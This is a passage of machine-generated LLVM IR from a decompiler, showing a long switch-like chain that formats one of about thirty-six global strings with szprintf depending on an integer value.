  br i1 %v2_a964, label %dec_label_pc_a96c, label %dec_label_pc_a994

dec_label_pc_a96c:                                ; preds = %entry
  %v2_a96c = ptrtoint i32* %stack_var_-36 to i32
  %v3_a978 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_a984 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_a990 = sext i8 %v3_a978 to i32
  %v6_a990 = sext i8 %v3_a984 to i32
  %v8_a990 = call i32 @szprintf(i32 %v2_a96c, i32 ptrtoint ([12 x i8]* @global_var_1fff0.74 to i32), i32 %v4_a990, i32 %v6_a990, i32 0)
  br label %dec_label_pc_a994

dec_label_pc_a994:                                ; preds = %entry, %dec_label_pc_a96c
  %v7_a998 = icmp eq i32 %v2_a93c, 1
  br i1 %v7_a998, label %dec_label_pc_a9a0, label %dec_label_pc_a9c8

dec_label_pc_a9a0:                                ; preds = %dec_label_pc_a994
  %v2_a9a0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_a9ac = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_a9b8 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_a9c4 = sext i8 %v3_a9ac to i32
  %v6_a9c4 = sext i8 %v3_a9b8 to i32
  %v8_a9c4 = call i32 @szprintf(i32 %v2_a9a0, i32 ptrtoint ([14 x i8]* @global_var_1fffc.76 to i32), i32 %v4_a9c4, i32 %v6_a9c4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a9c8

dec_label_pc_a9c8:                                ; preds = %dec_label_pc_a994, %dec_label_pc_a9a0
  %v7_a9cc = icmp eq i32 %v2_a93c, 2
  br i1 %v7_a9cc, label %dec_label_pc_a9d4, label %dec_label_pc_a9fc

dec_label_pc_a9d4:                                ; preds = %dec_label_pc_a9c8
  %v2_a9d4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_a9e0 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_a9ec = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_a9f8 = sext i8 %v3_a9e0 to i32
  %v6_a9f8 = sext i8 %v3_a9ec to i32
  %v8_a9f8 = call i32 @szprintf(i32 %v2_a9d4, i32 ptrtoint ([11 x i8]* @global_var_2000c.78 to i32), i32 %v4_a9f8, i32 %v6_a9f8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a9fc

dec_label_pc_a9fc:                                ; preds = %dec_label_pc_a9c8, %dec_label_pc_a9d4
  %v7_aa00 = icmp eq i32 %v2_a93c, 3
  br i1 %v7_aa00, label %dec_label_pc_aa08, label %dec_label_pc_aa30

dec_label_pc_aa08:                                ; preds = %dec_label_pc_a9fc
  %v2_aa08 = ptrtoint i32* %stack_var_-36 to i32
  %v3_aa14 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_aa20 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_aa2c = sext i8 %v3_aa14 to i32
  %v6_aa2c = sext i8 %v3_aa20 to i32
  %v8_aa2c = call i32 @szprintf(i32 %v2_aa08, i32 ptrtoint ([13 x i8]* @global_var_20018.80 to i32), i32 %v4_aa2c, i32 %v6_aa2c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aa30

dec_label_pc_aa30:                                ; preds = %dec_label_pc_a9fc, %dec_label_pc_aa08
  %v7_aa34 = icmp eq i32 %v2_a93c, 4
  br i1 %v7_aa34, label %dec_label_pc_aa3c, label %dec_label_pc_aa64

dec_label_pc_aa3c:                                ; preds = %dec_label_pc_aa30
  %v2_aa3c = ptrtoint i32* %stack_var_-36 to i32
  %v3_aa48 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_aa54 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_aa60 = sext i8 %v3_aa48 to i32
  %v6_aa60 = sext i8 %v3_aa54 to i32
  %v8_aa60 = call i32 @szprintf(i32 %v2_aa3c, i32 ptrtoint ([11 x i8]* @global_var_20028.82 to i32), i32 %v4_aa60, i32 %v6_aa60, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aa64

dec_label_pc_aa64:                                ; preds = %dec_label_pc_aa30, %dec_label_pc_aa3c
  %v7_aa68 = icmp eq i32 %v2_a93c, 5
  br i1 %v7_aa68, label %dec_label_pc_aa70, label %dec_label_pc_aa98

dec_label_pc_aa70:                                ; preds = %dec_label_pc_aa64
  %v2_aa70 = ptrtoint i32* %stack_var_-36 to i32
  %v3_aa7c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_aa88 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_aa94 = sext i8 %v3_aa7c to i32
  %v6_aa94 = sext i8 %v3_aa88 to i32
  %v8_aa94 = call i32 @szprintf(i32 %v2_aa70, i32 ptrtoint ([13 x i8]* @global_var_20034.84 to i32), i32 %v4_aa94, i32 %v6_aa94, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aa98

dec_label_pc_aa98:                                ; preds = %dec_label_pc_aa64, %dec_label_pc_aa70
  %v7_aa9c = icmp eq i32 %v2_a93c, 6
  br i1 %v7_aa9c, label %dec_label_pc_aaa4, label %dec_label_pc_aacc

dec_label_pc_aaa4:                                ; preds = %dec_label_pc_aa98
  %v2_aaa4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_aab0 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_aabc = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_aac8 = sext i8 %v3_aab0 to i32
  %v6_aac8 = sext i8 %v3_aabc to i32
  %v8_aac8 = call i32 @szprintf(i32 %v2_aaa4, i32 ptrtoint ([12 x i8]* @global_var_20044.86 to i32), i32 %v4_aac8, i32 %v6_aac8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aacc

dec_label_pc_aacc:                                ; preds = %dec_label_pc_aa98, %dec_label_pc_aaa4
  %v7_aad0 = icmp eq i32 %v2_a93c, 7
  br i1 %v7_aad0, label %dec_label_pc_aad8, label %dec_label_pc_ab00

dec_label_pc_aad8:                                ; preds = %dec_label_pc_aacc
  %v2_aad8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_aae4 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_aaf0 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_aafc = sext i8 %v3_aae4 to i32
  %v6_aafc = sext i8 %v3_aaf0 to i32
  %v8_aafc = call i32 @szprintf(i32 %v2_aad8, i32 ptrtoint ([13 x i8]* @global_var_20050.88 to i32), i32 %v4_aafc, i32 %v6_aafc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ab00

dec_label_pc_ab00:                                ; preds = %dec_label_pc_aacc, %dec_label_pc_aad8
  %v7_ab04 = icmp eq i32 %v2_a93c, 8
  br i1 %v7_ab04, label %dec_label_pc_ab0c, label %dec_label_pc_ab34

dec_label_pc_ab0c:                                ; preds = %dec_label_pc_ab00
  %v2_ab0c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ab18 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_ab24 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_ab30 = sext i8 %v3_ab18 to i32
  %v6_ab30 = sext i8 %v3_ab24 to i32
  %v8_ab30 = call i32 @szprintf(i32 %v2_ab0c, i32 ptrtoint ([13 x i8]* @global_var_20060.90 to i32), i32 %v4_ab30, i32 %v6_ab30, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ab34

dec_label_pc_ab34:                                ; preds = %dec_label_pc_ab00, %dec_label_pc_ab0c
  %v7_ab38 = icmp eq i32 %v2_a93c, 9
  br i1 %v7_ab38, label %dec_label_pc_ab40, label %dec_label_pc_ab68

dec_label_pc_ab40:                                ; preds = %dec_label_pc_ab34
  %v2_ab40 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ab4c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_ab58 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_ab64 = sext i8 %v3_ab4c to i32
  %v6_ab64 = sext i8 %v3_ab58 to i32
  %v8_ab64 = call i32 @szprintf(i32 %v2_ab40, i32 ptrtoint ([13 x i8]* @global_var_20070.92 to i32), i32 %v4_ab64, i32 %v6_ab64, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ab68

dec_label_pc_ab68:                                ; preds = %dec_label_pc_ab34, %dec_label_pc_ab40
  %v7_ab6c = icmp eq i32 %v2_a93c, 10
  br i1 %v7_ab6c, label %dec_label_pc_ab74, label %dec_label_pc_ab9c

dec_label_pc_ab74:                                ; preds = %dec_label_pc_ab68
  %v2_ab74 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ab80 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_ab8c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_ab98 = sext i8 %v3_ab80 to i32
  %v6_ab98 = sext i8 %v3_ab8c to i32
  %v8_ab98 = call i32 @szprintf(i32 %v2_ab74, i32 ptrtoint ([14 x i8]* @global_var_20080.94 to i32), i32 %v4_ab98, i32 %v6_ab98, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ab9c

dec_label_pc_ab9c:                                ; preds = %dec_label_pc_ab68, %dec_label_pc_ab74
  %v7_aba0 = icmp eq i32 %v2_a93c, 11
  br i1 %v7_aba0, label %dec_label_pc_aba8, label %dec_label_pc_abd0

dec_label_pc_aba8:                                ; preds = %dec_label_pc_ab9c
  %v2_aba8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_abb4 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_abc0 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_abcc = sext i8 %v3_abb4 to i32
  %v6_abcc = sext i8 %v3_abc0 to i32
  %v8_abcc = call i32 @szprintf(i32 %v2_aba8, i32 ptrtoint ([11 x i8]* @global_var_20090.96 to i32), i32 %v4_abcc, i32 %v6_abcc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_abd0

dec_label_pc_abd0:                                ; preds = %dec_label_pc_ab9c, %dec_label_pc_aba8
  %v7_abd4 = icmp eq i32 %v2_a93c, 12
  br i1 %v7_abd4, label %dec_label_pc_abdc, label %dec_label_pc_ac04

dec_label_pc_abdc:                                ; preds = %dec_label_pc_abd0
  %v2_abdc = ptrtoint i32* %stack_var_-36 to i32
  %v3_abe8 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_abf4 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_ac00 = sext i8 %v3_abe8 to i32
  %v6_ac00 = sext i8 %v3_abf4 to i32
  %v8_ac00 = call i32 @szprintf(i32 %v2_abdc, i32 ptrtoint ([13 x i8]* @global_var_2009c.98 to i32), i32 %v4_ac00, i32 %v6_ac00, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac04

dec_label_pc_ac04:                                ; preds = %dec_label_pc_abd0, %dec_label_pc_abdc
  %v7_ac08 = icmp eq i32 %v2_a93c, 13
  br i1 %v7_ac08, label %dec_label_pc_ac10, label %dec_label_pc_ac38

dec_label_pc_ac10:                                ; preds = %dec_label_pc_ac04
  %v2_ac10 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ac1c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_ac28 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_ac34 = sext i8 %v3_ac1c to i32
  %v6_ac34 = sext i8 %v3_ac28 to i32
  %v8_ac34 = call i32 @szprintf(i32 %v2_ac10, i32 ptrtoint ([13 x i8]* @global_var_200ac.100 to i32), i32 %v4_ac34, i32 %v6_ac34, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac38

dec_label_pc_ac38:                                ; preds = %dec_label_pc_ac04, %dec_label_pc_ac10
  %v7_ac3c = icmp eq i32 %v2_a93c, 14
  br i1 %v7_ac3c, label %dec_label_pc_ac44, label %dec_label_pc_ac6c

dec_label_pc_ac44:                                ; preds = %dec_label_pc_ac38
  %v2_ac44 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ac50 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_ac5c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_ac68 = sext i8 %v3_ac50 to i32
  %v6_ac68 = sext i8 %v3_ac5c to i32
  %v8_ac68 = call i32 @szprintf(i32 %v2_ac44, i32 ptrtoint ([13 x i8]* @global_var_200bc.102 to i32), i32 %v4_ac68, i32 %v6_ac68, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac6c

dec_label_pc_ac6c:                                ; preds = %dec_label_pc_ac38, %dec_label_pc_ac44
  %v7_ac70 = icmp eq i32 %v2_a93c, 15
  br i1 %v7_ac70, label %dec_label_pc_ac78, label %dec_label_pc_aca0

dec_label_pc_ac78:                                ; preds = %dec_label_pc_ac6c
  %v2_ac78 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ac84 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_ac90 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_ac9c = sext i8 %v3_ac84 to i32
  %v6_ac9c = sext i8 %v3_ac90 to i32
  %v8_ac9c = call i32 @szprintf(i32 %v2_ac78, i32 ptrtoint ([13 x i8]* @global_var_200cc.104 to i32), i32 %v4_ac9c, i32 %v6_ac9c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aca0

dec_label_pc_aca0:                                ; preds = %dec_label_pc_ac6c, %dec_label_pc_ac78
  %v7_aca4 = icmp eq i32 %v2_a93c, 16
  br i1 %v7_aca4, label %dec_label_pc_acac, label %dec_label_pc_acd4

dec_label_pc_acac:                                ; preds = %dec_label_pc_aca0
  %v2_acac = ptrtoint i32* %stack_var_-36 to i32
  %v3_acb8 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_acc4 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_acd0 = sext i8 %v3_acb8 to i32
  %v6_acd0 = sext i8 %v3_acc4 to i32
  %v8_acd0 = call i32 @szprintf(i32 %v2_acac, i32 ptrtoint ([13 x i8]* @global_var_200dc.106 to i32), i32 %v4_acd0, i32 %v6_acd0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_acd4

dec_label_pc_acd4:                                ; preds = %dec_label_pc_aca0, %dec_label_pc_acac
  %v7_acd8 = icmp eq i32 %v2_a93c, 17
  br i1 %v7_acd8, label %dec_label_pc_ace0, label %dec_label_pc_ad08

dec_label_pc_ace0:                                ; preds = %dec_label_pc_acd4
  %v2_ace0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_acec = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_acf8 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_ad04 = sext i8 %v3_acec to i32
  %v6_ad04 = sext i8 %v3_acf8 to i32
  %v8_ad04 = call i32 @szprintf(i32 %v2_ace0, i32 ptrtoint ([13 x i8]* @global_var_200ec.108 to i32), i32 %v4_ad04, i32 %v6_ad04, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad08

dec_label_pc_ad08:                                ; preds = %dec_label_pc_acd4, %dec_label_pc_ace0
  %v7_ad0c = icmp eq i32 %v2_a93c, 18
  br i1 %v7_ad0c, label %dec_label_pc_ad14, label %dec_label_pc_ad3c

dec_label_pc_ad14:                                ; preds = %dec_label_pc_ad08
  %v2_ad14 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ad20 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_ad2c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_ad38 = sext i8 %v3_ad20 to i32
  %v6_ad38 = sext i8 %v3_ad2c to i32
  %v8_ad38 = call i32 @szprintf(i32 %v2_ad14, i32 ptrtoint ([13 x i8]* @global_var_200fc.110 to i32), i32 %v4_ad38, i32 %v6_ad38, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad3c

dec_label_pc_ad3c:                                ; preds = %dec_label_pc_ad08, %dec_label_pc_ad14
  %v7_ad40 = icmp eq i32 %v2_a93c, 19
  br i1 %v7_ad40, label %dec_label_pc_ad48, label %dec_label_pc_ad70

dec_label_pc_ad48:                                ; preds = %dec_label_pc_ad3c
  %v2_ad48 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ad54 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_ad60 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_ad6c = sext i8 %v3_ad54 to i32
  %v6_ad6c = sext i8 %v3_ad60 to i32
  %v8_ad6c = call i32 @szprintf(i32 %v2_ad48, i32 ptrtoint ([11 x i8]* @global_var_2010c.112 to i32), i32 %v4_ad6c, i32 %v6_ad6c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad70

dec_label_pc_ad70:                                ; preds = %dec_label_pc_ad3c, %dec_label_pc_ad48
  %v7_ad74 = icmp eq i32 %v2_a93c, 20
  br i1 %v7_ad74, label %dec_label_pc_ad7c, label %dec_label_pc_ada4

dec_label_pc_ad7c:                                ; preds = %dec_label_pc_ad70
  %v2_ad7c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ad88 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_ad94 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_ada0 = sext i8 %v3_ad88 to i32
  %v6_ada0 = sext i8 %v3_ad94 to i32
  %v8_ada0 = call i32 @szprintf(i32 %v2_ad7c, i32 ptrtoint ([12 x i8]* @global_var_20118.114 to i32), i32 %v4_ada0, i32 %v6_ada0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ada4

dec_label_pc_ada4:                                ; preds = %dec_label_pc_ad70, %dec_label_pc_ad7c
  %v7_ada8 = icmp eq i32 %v2_a93c, 21
  br i1 %v7_ada8, label %dec_label_pc_adb0, label %dec_label_pc_add8

dec_label_pc_adb0:                                ; preds = %dec_label_pc_ada4
  %v2_adb0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_adbc = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_adc8 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_add4 = sext i8 %v3_adbc to i32
  %v6_add4 = sext i8 %v3_adc8 to i32
  %v8_add4 = call i32 @szprintf(i32 %v2_adb0, i32 ptrtoint ([13 x i8]* @global_var_20124.116 to i32), i32 %v4_add4, i32 %v6_add4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_add8

dec_label_pc_add8:                                ; preds = %dec_label_pc_ada4, %dec_label_pc_adb0
  %v7_addc = icmp eq i32 %v2_a93c, 22
  br i1 %v7_addc, label %dec_label_pc_ade4, label %dec_label_pc_ae0c

dec_label_pc_ade4:                                ; preds = %dec_label_pc_add8
  %v2_ade4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_adf0 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_adfc = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_ae08 = sext i8 %v3_adf0 to i32
  %v6_ae08 = sext i8 %v3_adfc to i32
  %v8_ae08 = call i32 @szprintf(i32 %v2_ade4, i32 ptrtoint ([11 x i8]* @global_var_20134.118 to i32), i32 %v4_ae08, i32 %v6_ae08, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae0c

dec_label_pc_ae0c:                                ; preds = %dec_label_pc_add8, %dec_label_pc_ade4
  %v7_ae10 = icmp eq i32 %v2_a93c, 23
  br i1 %v7_ae10, label %dec_label_pc_ae18, label %dec_label_pc_ae40

dec_label_pc_ae18:                                ; preds = %dec_label_pc_ae0c
  %v2_ae18 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ae24 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_ae30 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_ae3c = sext i8 %v3_ae24 to i32
  %v6_ae3c = sext i8 %v3_ae30 to i32
  %v8_ae3c = call i32 @szprintf(i32 %v2_ae18, i32 ptrtoint ([11 x i8]* @global_var_20140.120 to i32), i32 %v4_ae3c, i32 %v6_ae3c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae40

dec_label_pc_ae40:                                ; preds = %dec_label_pc_ae0c, %dec_label_pc_ae18
  %v7_ae44 = icmp eq i32 %v2_a93c, 24
  br i1 %v7_ae44, label %dec_label_pc_ae4c, label %dec_label_pc_ae74

dec_label_pc_ae4c:                                ; preds = %dec_label_pc_ae40
  %v2_ae4c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ae58 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_ae64 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_ae70 = sext i8 %v3_ae58 to i32
  %v6_ae70 = sext i8 %v3_ae64 to i32
  %v8_ae70 = call i32 @szprintf(i32 %v2_ae4c, i32 ptrtoint ([12 x i8]* @global_var_2014c.122 to i32), i32 %v4_ae70, i32 %v6_ae70, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae74

dec_label_pc_ae74:                                ; preds = %dec_label_pc_ae40, %dec_label_pc_ae4c
  %v7_ae78 = icmp eq i32 %v2_a93c, 25
  br i1 %v7_ae78, label %dec_label_pc_ae80, label %dec_label_pc_aea8

dec_label_pc_ae80:                                ; preds = %dec_label_pc_ae74
  %v2_ae80 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ae8c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_ae98 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_aea4 = sext i8 %v3_ae8c to i32
  %v6_aea4 = sext i8 %v3_ae98 to i32
  %v8_aea4 = call i32 @szprintf(i32 %v2_ae80, i32 ptrtoint ([12 x i8]* @global_var_20158.124 to i32), i32 %v4_aea4, i32 %v6_aea4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aea8

dec_label_pc_aea8:                                ; preds = %dec_label_pc_ae74, %dec_label_pc_ae80
  %v7_aeac = icmp eq i32 %v2_a93c, 26
  br i1 %v7_aeac, label %dec_label_pc_aeb4, label %dec_label_pc_aedc

dec_label_pc_aeb4:                                ; preds = %dec_label_pc_aea8
  %v2_aeb4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_aec0 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_aecc = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_aed8 = sext i8 %v3_aec0 to i32
  %v6_aed8 = sext i8 %v3_aecc to i32
  %v8_aed8 = call i32 @szprintf(i32 %v2_aeb4, i32 ptrtoint ([12 x i8]* @global_var_20164.126 to i32), i32 %v4_aed8, i32 %v6_aed8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aedc

dec_label_pc_aedc:                                ; preds = %dec_label_pc_aea8, %dec_label_pc_aeb4
  %v7_aee0 = icmp eq i32 %v2_a93c, 27
  br i1 %v7_aee0, label %dec_label_pc_aee8, label %dec_label_pc_af10

dec_label_pc_aee8:                                ; preds = %dec_label_pc_aedc
  %v2_aee8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_aef4 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_af00 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_af0c = sext i8 %v3_aef4 to i32
  %v6_af0c = sext i8 %v3_af00 to i32
  %v8_af0c = call i32 @szprintf(i32 %v2_aee8, i32 ptrtoint ([13 x i8]* @global_var_20170.128 to i32), i32 %v4_af0c, i32 %v6_af0c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af10

dec_label_pc_af10:                                ; preds = %dec_label_pc_aedc, %dec_label_pc_aee8
  %v7_af14 = icmp eq i32 %v2_a93c, 28
  br i1 %v7_af14, label %dec_label_pc_af1c, label %dec_label_pc_af44

dec_label_pc_af1c:                                ; preds = %dec_label_pc_af10
  %v2_af1c = ptrtoint i32* %stack_var_-36 to i32
  %v3_af28 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_af34 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_af40 = sext i8 %v3_af28 to i32
  %v6_af40 = sext i8 %v3_af34 to i32
  %v8_af40 = call i32 @szprintf(i32 %v2_af1c, i32 ptrtoint ([13 x i8]* @global_var_20180.130 to i32), i32 %v4_af40, i32 %v6_af40, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af44

dec_label_pc_af44:                                ; preds = %dec_label_pc_af10, %dec_label_pc_af1c
  %v7_af48 = icmp eq i32 %v2_a93c, 29
  br i1 %v7_af48, label %dec_label_pc_af50, label %dec_label_pc_af78

dec_label_pc_af50:                                ; preds = %dec_label_pc_af44
  %v2_af50 = ptrtoint i32* %stack_var_-36 to i32
  %v3_af5c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_af68 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_af74 = sext i8 %v3_af5c to i32
  %v6_af74 = sext i8 %v3_af68 to i32
  %v8_af74 = call i32 @szprintf(i32 %v2_af50, i32 ptrtoint ([12 x i8]* @global_var_20190.132 to i32), i32 %v4_af74, i32 %v6_af74, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af78

dec_label_pc_af78:                                ; preds = %dec_label_pc_af44, %dec_label_pc_af50
  %v7_af7c = icmp eq i32 %v2_a93c, 30
  br i1 %v7_af7c, label %dec_label_pc_af84, label %dec_label_pc_afac

dec_label_pc_af84:                                ; preds = %dec_label_pc_af78
  %v2_af84 = ptrtoint i32* %stack_var_-36 to i32
  %v3_af90 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_af9c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_afa8 = sext i8 %v3_af90 to i32
  %v6_afa8 = sext i8 %v3_af9c to i32
  %v8_afa8 = call i32 @szprintf(i32 %v2_af84, i32 ptrtoint ([13 x i8]* @global_var_2019c.134 to i32), i32 %v4_afa8, i32 %v6_afa8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_afac

dec_label_pc_afac:                                ; preds = %dec_label_pc_af78, %dec_label_pc_af84
  %v7_afb0 = icmp eq i32 %v2_a93c, 31
  br i1 %v7_afb0, label %dec_label_pc_afb8, label %dec_label_pc_afe0

dec_label_pc_afb8:                                ; preds = %dec_label_pc_afac
  %v2_afb8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_afc4 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_afd0 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_afdc = sext i8 %v3_afc4 to i32
  %v6_afdc = sext i8 %v3_afd0 to i32
  %v8_afdc = call i32 @szprintf(i32 %v2_afb8, i32 ptrtoint ([12 x i8]* @global_var_201ac.136 to i32), i32 %v4_afdc, i32 %v6_afdc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_afe0

dec_label_pc_afe0:                                ; preds = %dec_label_pc_afac, %dec_label_pc_afb8
  %v7_afe4 = icmp eq i32 %v2_a93c, 32
  br i1 %v7_afe4, label %dec_label_pc_afec, label %dec_label_pc_b014

dec_label_pc_afec:                                ; preds = %dec_label_pc_afe0
  %v2_afec = ptrtoint i32* %stack_var_-36 to i32
  %v3_aff8 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b004 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b010 = sext i8 %v3_aff8 to i32
  %v6_b010 = sext i8 %v3_b004 to i32
  %v8_b010 = call i32 @szprintf(i32 %v2_afec, i32 ptrtoint ([11 x i8]* @global_var_201b8.138 to i32), i32 %v4_b010, i32 %v6_b010, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b014

dec_label_pc_b014:                                ; preds = %dec_label_pc_afe0, %dec_label_pc_afec
  %v7_b018 = icmp eq i32 %v2_a93c, 33
  br i1 %v7_b018, label %dec_label_pc_b020, label %dec_label_pc_b048

dec_label_pc_b020:                                ; preds = %dec_label_pc_b014
  %v2_b020 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b02c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b038 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b044 = sext i8 %v3_b02c to i32
  %v6_b044 = sext i8 %v3_b038 to i32
  %v8_b044 = call i32 @szprintf(i32 %v2_b020, i32 ptrtoint ([12 x i8]* @global_var_201c4.140 to i32), i32 %v4_b044, i32 %v6_b044, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b048

dec_label_pc_b048:                                ; preds = %dec_label_pc_b014, %dec_label_pc_b020
  %v7_b04c = icmp eq i32 %v2_a93c, 34
  br i1 %v7_b04c, label %dec_label_pc_b054, label %dec_label_pc_b07c

dec_label_pc_b054:                                ; preds = %dec_label_pc_b048
  %v2_b054 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b060 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b06c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b078 = sext i8 %v3_b060 to i32
  %v6_b078 = sext i8 %v3_b06c to i32
  %v8_b078 = call i32 @szprintf(i32 %v2_b054, i32 ptrtoint ([12 x i8]* @global_var_201d0.142 to i32), i32 %v4_b078, i32 %v6_b078, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b07c

dec_label_pc_b07c:                                ; preds = %dec_label_pc_b048, %dec_label_pc_b054
  %v7_b080 = icmp eq i32 %v2_a93c, 35
  br i1 %v7_b080, label %dec_label_pc_b088, label %dec_label_pc_b0b0

dec_label_pc_b088:                                ; preds = %dec_label_pc_b07c
  %v2_b088 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b094 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_b0a0 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_b0ac = sext i8 %v3_b094 to i32
  %v6_b0ac = sext i8 %v3_b0a0 to i32
